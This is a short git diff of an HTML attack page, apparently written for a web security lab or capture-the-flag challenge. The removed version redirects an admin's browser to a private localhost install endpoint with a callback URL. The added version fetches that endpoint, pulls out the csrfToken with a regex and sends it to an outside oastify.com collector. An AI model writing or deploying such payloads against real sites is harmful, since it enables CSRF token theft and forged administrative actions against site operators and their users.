@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h3>Final CSRF Redirect Test</h3>
-
-    <script>
-      // Redirect admin to internal page with callback param
-      location.href = "http://localhost:3000/apiv1/private/install?cb=https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/ping";
-    </script>
-
-    <button id="installbutton">Click</button>
-  </body>
+<body>
+<script>
+fetch("http://localhost:3000/apiv1/private/install")
+  .then(r => r.text())
+  .then(html => {
+    const match = html.match(/name="csrfToken" value="([^"]+)"/);
+    const token = match ? match[1] : "no-token";
+    fetch("https://kk8qhbpn2nogsc6c9kcgvh3olfr6fz3o.oastify.com/log?token=" + token);
+  });
+</script>
+</body>
 </html>
+
